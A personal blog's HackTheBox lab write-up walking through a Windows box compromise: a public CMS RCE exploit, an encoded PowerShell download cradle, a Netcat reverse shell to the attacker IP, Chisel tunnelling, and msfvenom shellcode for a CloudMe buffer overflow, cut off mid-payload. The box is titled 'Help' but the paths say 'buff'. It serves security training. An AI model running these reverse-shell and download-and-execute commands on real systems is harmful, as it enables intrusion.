<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
  HTB: Help Writeup · mattjohnson.cloud
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="matt johnson">
<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Help.">
<meta name="keywords" content="blog,cloud,personal,security,windows,chess">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HTB: Help Writeup">
  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Help.">

<meta property="og:url" content="http://localhost:1313/posts/htb-help/">
  <meta property="og:site_name" content="mattjohnson.cloud">
  <meta property="og:title" content="HTB: Help Writeup">
  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Help.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-12-19T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-12-19T00:00:00+00:00">
    <meta property="article:tag" content="Hackthebox">
    <meta property="article:tag" content="Security">




<link rel="canonical" href="http://localhost:1313/posts/htb-help/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/">
      mattjohnson.cloud
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">about</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/tags/">tags</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="http://localhost:1313/posts/htb-help/">
              HTB: Help Writeup
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2020-12-19T00:00:00Z">
                December 19, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              7-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="/authors/matt-johnson/">Matt Johnson</a></div>

          
          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="/tags/hackthebox/">Hackthebox</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/security/">Security</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <div class="custom-toc">
    <nav id="TableOfContents">
  <ol>
    <li><a href="#high-level-information">High-Level Information</a></li>
    <li><a href="#initial-foothold">Initial Foothold</a></li>
    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  </ol>
</nav>
</div>
<h1 id="high-level-information">
  High-Level Information
  <a class="heading-link" href="#high-level-information">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Machine Name: Help</p>
<p>IP Address: 10.10.10.198</p>
<p>Difficulty: Easy</p>
<p>Summary: HackTheBox&rsquo;s Help was a relatively straightforward box which required the attacker to use a unmodified script to gain remote code execution and a rudimentary shell, upgrade that to a full shell, forward the port for a vulnerable service, and exploit a buffer overflow vulnerability in that service. The principal skills gained during this exercise include using encoded powershell commands to avoid bad characters, setting up a port forward, and generating custom shell code using msfvenom.</p>
<p>Tools Used: Nmap, Netcat, Chisel, Msfvenom</p>
<h1 id="initial-foothold">
  Initial Foothold
  <a class="heading-link" href="#initial-foothold">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>As always, I began by running Nmap:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>root@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼# nmap -sC -sV -p- 10.10.10.198
</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-08-01 15:02 CDT
</span></span><span style="display:flex;"><span>Stats: 0:05:55 elapsed; <span style="color:#a5d6ff">0</span> hosts completed <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> up<span style="color:#ff7b72;font-weight:bold">)</span>, <span style="color:#a5d6ff">1</span> undergoing SYN Stealth Scan
</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 76.09% <span style="color:#ff7b72">done</span>; ETC: 15:10 <span style="color:#ff7b72;font-weight:bold">(</span>0:01:52 remaining<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.198
</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.14s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65533</span> filtered ports
</span></span><span style="display:flex;"><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>7680/tcp open pando-pub?
</span></span><span style="display:flex;"><span>8080/tcp open http Apache httpd 2.4.43 <span style="color:#ff7b72;font-weight:bold">((</span>Win64<span style="color:#ff7b72;font-weight:bold">)</span> OpenSSL/1.1.1g PHP/7.4.6<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>| http-open-proxy: Potentially OPEN proxy.
</span></span><span style="display:flex;"><span>|_Methods supported:CONNECTION
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.43 <span style="color:#ff7b72;font-weight:bold">(</span>Win64<span style="color:#ff7b72;font-weight:bold">)</span> OpenSSL/1.1.1g PHP/7.4.6
</span></span><span style="display:flex;"><span>|_http-title: mrb3n<span style="color:#f85149">&#39;</span>s Bro Hut
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 529.42 seconds
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>root@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼#
</span></span><span style="display:flex;"><span>         
</span></span></code></pre></div><p>With only port 8080 open, I began to enumerate the website:</p>
<p><img src="site-home.png" alt=""> <img src="site-404.png" alt=""></p>
<p>While browsing the website, I came across some interesting information disclosure within the contact page:</p>
<p><img src="site-info-disclosure.png" alt=""></p>
<p>Google quickly pointed towards an <a href="https://www.exploit-db.com/exploits/48506"  class="external-link" target="_blank" rel="noopener">RCE exploit</a> for this version of the CMS.</p>
<p>Conveniently, no modification to the script was necessary and I was able to gain RCE.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ python <span style="color:#a5d6ff">48506</span> http://10.10.10.198:8080/
</span></span><span style="display:flex;"><span>/<span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>/vvvvvvvvvvvv <span style="color:#79c0ff">\-</span>-------------------------------------,
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">`</span>^^^^^^^^^^^^ /<span style="color:#ff7b72;font-weight:bold">============</span><span style="color:#79c0ff">BOKU</span><span style="color:#ff7b72;font-weight:bold">=====================</span><span style="color:#a5d6ff">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">\/
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[+] Successfully connected to webshell.
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">C:\xampp\htdocs\gym\upload&gt; whoami
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">�PNG
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">buff\shaun
</span></span></span></code></pre></div><p>However, the one issue that I noticed within the script itself is that the &ldquo;shell&rdquo; is not a shell at all. It is a shell emulator, but each command is basically run individually. In order to break out of that and get a fully functioning shell, I hosted a simple web server and downloaded Netcat using a powershell encoded command. Once that was downloaded, I ran a Netcat listener on my host machine and connected to it from the remote machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ cat downloadnc.cmd 
</span></span><span style="display:flex;"><span>IEX<span style="color:#ff7b72;font-weight:bold">(</span>New-Object System.Net.WebClient<span style="color:#ff7b72;font-weight:bold">)</span>.downloadFile<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;http://10.10.14.2/nc.exe&#34;</span>,<span style="color:#a5d6ff">&#34;c:\xampp\htdocs\gym\upload\nc.exe&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ cat downloadnc.cmd | iconv -t UTF-16LE | base64 -w0 SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyAC8AbgBjAC4AZQB4AGUAIgAsACIAYwA6AFwAeABhAG0AcABwAFwAaAB0AGQAbwBjAHMAXABnAHkAbQBcAHUAcABsAG8AYQBkAFwAbgBjAC4AZQB4AGUAIgApAAoA
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload&gt; powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyAC8AbgBjAC4AZQB4AGUAIgAsACIAYwA6AFwAeABhAG0AcABwAFwAaAB0AGQAbwBjAHMAXABnAHkAbQBcAHUAcABsAG8AYQBkAFwAbgBjAC4AZQB4AGUAIgApAAoA
</span></span><span style="display:flex;"><span> �PNG
</span></span><span style="display:flex;"><span> C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload&gt; nc.exe 10.10.14.2 <span style="color:#a5d6ff">4444</span> -e cmd.exe
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ nc -nvlp <span style="color:#a5d6ff">4444</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.2<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.198<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">49678</span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#ff7b72;font-weight:bold">[</span>Version 10.0.17134.1610<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>c<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#a5d6ff">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload&gt;dir
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span>Volume in drive C has no label.
</span></span><span style="display:flex;"><span>Volume Serial Number is A22D-49F7
</span></span><span style="display:flex;"><span>Directory of C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload
</span></span><span style="display:flex;"><span>27/09/2020 19:08 &lt;DIR&gt; .
</span></span><span style="display:flex;"><span>27/09/2020 19:08 &lt;DIR&gt; ..
</span></span><span style="display:flex;"><span>27/09/2020 19:09 8,347,648 chisel.exe
</span></span><span style="display:flex;"><span>27/09/2020 19:04 <span style="color:#a5d6ff">53</span> kamehameha.php
</span></span><span style="display:flex;"><span>27/09/2020 19:08 59,392 nc.exe
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">3</span> File<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span> 8,407,093 bytes
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span> Dir<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span> 7,398,076,416 bytes free
</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload&gt;
</span></span></code></pre></div><p>From there, I grabbed the user flag and began the next phase: privilege escalation.</p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a class="heading-link" href="#privilege-escalation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Internal enumeration ended up being unusually simple. I was just poking around manually when I came across a client binary for CloudMe, a cloud-based file storage service. The particular version of this client, 1.11.2, was susceptible to a buffer overflow attack that would result in code execution. I ran <code>netstat</code> and checked to see if port 8888 was open, and sure enough it was.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>c:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\s</span>haun<span style="color:#79c0ff">\D</span>ownloads&gt;dir
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span>Volume in drive C has no label.
</span></span><span style="display:flex;"><span>Volume Serial Number is A22D-49F7
</span></span><span style="display:flex;"><span>Directory of c:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\s</span>haun<span style="color:#79c0ff">\D</span>ownloads
</span></span><span style="display:flex;"><span>14/07/2020 13:27 &lt;DIR&gt; .
</span></span><span style="display:flex;"><span>14/07/2020 13:27 &lt;DIR&gt; ..
</span></span><span style="display:flex;"><span>16/06/2020 16:26 17,830,824 CloudMe_1112.exe
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">1</span> File<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span> 17,830,824 bytes
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span> Dir<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span> 7,428,366,336 bytes free
</span></span></code></pre></div><p>I managed to find <a href="https://www.exploit-db.com/exploits/48389"  class="external-link" target="_blank" rel="noopener">an exploit</a> for the CloudMe vulnerability, but the issue was that it was written in python. Python, being an interpreted language, is not really a language that lends itself well to compilation. To get around this issue, I decided to forward the port to my host machine using <a href="https://github.com/jpillora/chisel"  class="external-link" target="_blank" rel="noopener">Chisel</a>, my TCP tunnel of choice. In order to use it, I uploaded the Chisel binary to the remote machine, started up my Chisel server, and connected to it via the client:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ cat downloadchisel.cmd
</span></span><span style="display:flex;"><span>IEX<span style="color:#ff7b72;font-weight:bold">(</span>New-Object System.Net.WebClient<span style="color:#ff7b72;font-weight:bold">)</span>.downloadFile<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;http://10.10.14.2/chisel.exe&#34;</span>,<span style="color:#a5d6ff">&#34;c:\xampp\htdocs\gym\upload\chisel.exe&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ cat downloadchisel.cmd | iconv -t UTF-16LE| base64 -w0
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyAC8AYwBoAGkAcwBlAGwALgBlAHgAZQAiACwAIgBjADoAXAB4AGEAbQBwAHAAXABoAHQAZABvAGMAcwBcAGcAeQBtAFwAdQBwAGwAbwBhAGQAXABjAGgAaQBzAGUAbAAuAGUAeABlACIAKQAKAA</span><span style="color:#ff7b72;font-weight:bold">==</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload&gt; powershell -enc <span style="color:#79c0ff">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyAC8AYwBoAGkAcwBlAGwALgBlAHgAZQAiACwAIgBjADoAXAB4AGEAbQBwAHAAXABoAHQAZABvAGMAcwBcAGcAeQBtAFwAdQBwAGwAbwBhAGQAXABjAGgAaQBzAGUAbAAuAGUAeABlACIAKQAKAA</span><span style="color:#ff7b72;font-weight:bold">==</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff/evidence<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ chisel server -p <span style="color:#a5d6ff">8000</span> --reverse
</span></span><span style="display:flex;"><span>2020/09/27 18:17:44 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2020/09/27 18:17:44 server: Fingerprint 18:ea:af:d8:e2:bb:83:95:07:91:6c:2b:f9:04:0a:1a
</span></span><span style="display:flex;"><span>2020/09/27 18:17:44 server: Listening on 0.0.0.0:8000...
</span></span><span style="display:flex;"><span>c:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\g</span>ym<span style="color:#79c0ff">\u</span>pload&gt;.<span style="color:#79c0ff">\c</span>hisel.exe client 10.10.14.2:8000 R:8891:127.0.0.1:8888
</span></span><span style="display:flex;"><span>.<span style="color:#79c0ff">\c</span>hisel.exe client 10.10.14.2:8000 R:8891:127.0.0.1:8888
</span></span><span style="display:flex;"><span>2020/09/27 19:21:03 client: Connecting to ws://10.10.14.2:8000
</span></span><span style="display:flex;"><span>2020/09/27 19:21:03 client: Fingerprint 18:ea:af:d8:e2:bb:83:95:07:91:6c:2b:f9:04:0a:1a
</span></span><span style="display:flex;"><span>2020/09/27 19:21:04 client: Connected <span style="color:#ff7b72;font-weight:bold">(</span>Latency 159.294ms<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span></code></pre></div><p>From there, I verified that the tunneling worked by checking <code>netstat</code> on my host machine and verifying that port 8891 (the port I chose to use for my host machine) was listening:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ netstat -ano | grep <span style="color:#a5d6ff">8891</span>
</span></span><span style="display:flex;"><span>tcp <span style="color:#a5d6ff">0</span> <span style="color:#a5d6ff">0</span> 0.0.0.0:8891 0.0.0.0:* LISTEN off <span style="color:#ff7b72;font-weight:bold">(</span>0.00/0/0<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ 
</span></span></code></pre></div><p>In addition to that, the POC exploit noted above required a bit of modification in order for it to actually produce the results I wanted. I used msfvenom to generate python code which would execute Netcat and (hopefully) get me a root shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ msfvenom -p windows/exec <span style="color:#79c0ff">CMD</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.2 4000 -e cmd.exe&#39;</span> -b <span style="color:#a5d6ff">&#39;\x00\x0a\0d&#39;</span> -f python -v payload
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#a5d6ff">11</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#a5d6ff">1</span> iterations of x86/shikata_ga_nai
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#a5d6ff">272</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#a5d6ff">272</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#a5d6ff">272</span> bytes
</span></span><span style="display:flex;"><span>Final size of python file: <span style="color:#a5d6ff">1448</span> bytes
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">=</span> b<span style="color:#a5d6ff">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xba\x9a\xb2\x94\xe2\xda\xd7\xd9\x74\x24\xf4\x5e&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x2b\xc9\xb1\x3e\x31\x56\x13\x83\xee\xfc\x03\x56&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x95\x50\x61\x1e\x41\x16\x8a\xdf\x91\x77\x02\x3a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xa0\xb7\x70\x4e\x92\x07\xf2\x02\x1e\xe3\x56\xb7&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x95\x81\x7e\xb8\x1e\x2f\x59\xf7\x9f\x1c\x99\x96&#34;</span>
